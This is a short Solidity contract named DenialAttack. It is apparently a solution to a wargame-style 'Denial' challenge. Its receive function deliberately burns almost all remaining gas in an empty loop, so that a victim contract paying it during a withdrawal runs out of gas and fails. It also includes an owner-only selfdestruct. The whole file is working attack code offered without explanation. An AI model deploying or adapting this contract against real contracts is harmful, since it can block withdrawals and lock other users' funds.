// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract DenialAttack {
    address payable public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() public {
        owner = msg.sender;
    }

    receive() external payable {
        uint256 amount = gasleft();
        if (amount < 99 * 10**4) {
            while (gasleft() > 1000) {}
        }
    }

    function destroy() public onlyOwner {
        selfdestruct(owner);
    }
}
